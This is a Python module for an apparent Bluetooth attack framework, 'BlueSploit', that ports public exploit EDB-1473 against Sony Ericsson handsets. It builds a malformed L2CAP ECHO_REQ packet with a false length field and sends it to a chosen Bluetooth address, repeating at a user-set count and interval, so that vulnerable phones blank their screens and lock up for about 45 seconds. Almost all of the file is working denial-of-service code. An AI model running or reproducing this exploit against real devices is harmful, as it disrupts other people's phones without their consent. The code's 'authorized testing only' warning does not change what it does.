"""
BlueSploit Module: Sony/Ericsson L2CAP Echo Display-Reset DoS
EDB-ID: 1473  (Pierre Betouin, 2006)

Sends an L2CAP ECHO_REQ with a malformed length field. Vulnerable
Sony/Ericsson handsets (K600i, V600i, K750i, W800i, …) slowly fade their
screen to black, then white, then recover after ~45 seconds.

Pure protocol DoS, no payload, no RCE.
"""

import struct
import time
from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors,
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False


L2CAP_ECHO_REQ = 0x08

# C PoC payload: 4-byte buffer, code=ECHO_REQ, ident=1, len=1 (FAKE_SIZE)
# memset(buffer, 90, 4); buffer[0]=0x08, buffer[1]=1, buffer[2]=1, buffer[3]=0x5A
_PAYLOAD_SIZE = 4
_FAKE_LEN     = 1


AFFECTED_DEVICES = [
    "Sony Ericsson K600i",
    "Sony Ericsson V600i",
    "Sony Ericsson K750i",
    "Sony Ericsson W800i",
    "(possibly other 2005-era SE/Symbian phones)",
]


class Module(DosModule):
    """
    Sony/Ericsson Display-Reset DoS

    The handset's L2CAP stack mishandles an ECHO_REQ where the cmd_hdr.len
    field claims fewer payload bytes than were actually delivered.
    """

    info = ModuleInfo(
        name="dos/sony_ericsson_reset_display",
        description="Sony/Ericsson L2CAP ECHO_REQ display-fade DoS (EDB-1473)",
        author=["Pierre Betouin"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.MEDIUM,
        references=[
            "https://www.exploit-db.com/exploits/1473",
        ],
    )

    def _setup_options(self) -> None:
        self.options = {
            "target": ModuleOption(
                name="target", required=True,
                description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)",
            ),
            "count": ModuleOption(
                name="count", required=False, default=1,
                description="Number of malformed packets to send",
            ),
            "interval": ModuleOption(
                name="interval", required=False, default=2,
                description="Seconds between packets",
            ),
        }

    def _build_payload(self) -> bytes:
        # 4-byte L2CAP cmd hdr: code, ident, len(LE16), len=1 but no body
        return struct.pack("<BBH", L2CAP_ECHO_REQ, 1, _FAKE_LEN)

    def run(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("Install pybluez2: pip install pybluez2")
            return False

        target   = self.target
        count    = int(self.get_option("count"))
        interval = float(self.get_option("interval"))

        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False

        C = Colors
        print(f"\n  {C.RED}╔{'═'*55}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET}  {C.BOLD}Sony/Ericsson Display-Reset DoS (EDB-1473){C.RESET}    {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*55}╝{C.RESET}\n")
        print_info(f"Target : {target}")
        print_info(f"Packets: {count} × {_PAYLOAD_SIZE} bytes")
        print_warning("Authorized testing only, vulnerable phones lock up ~45 s")

        sock = None
        sent = 0
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(10)
            print_info(f"Connecting to {target}...")
            sock.connect((target, 1))   # PSM 1 (SDP)
            print_success("Connected, sending malformed ECHO_REQ")

            payload = self._build_payload()
            for i in range(count):
                sock.send(payload)
                sent += 1
                hex_str = " ".join(f"{b:02X}" for b in payload)
                print(f"  [{i+1}/{count}] sent {len(payload)} bytes  [{hex_str}]")
                if i < count - 1:
                    time.sleep(interval)

            print_success("Done. Watch target screen for the fade-to-black behaviour.")

        except (OSError, IOError) as e:
            print_error(f"Connection error: {e}")
        except Exception as e:
            print_error(f"Error: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

        self.add_result({
            "target": target, "edb_id": 1473,
            "packets_sent": sent,
            "vulnerable_devices": AFFECTED_DEVICES,
        })
        return sent > 0
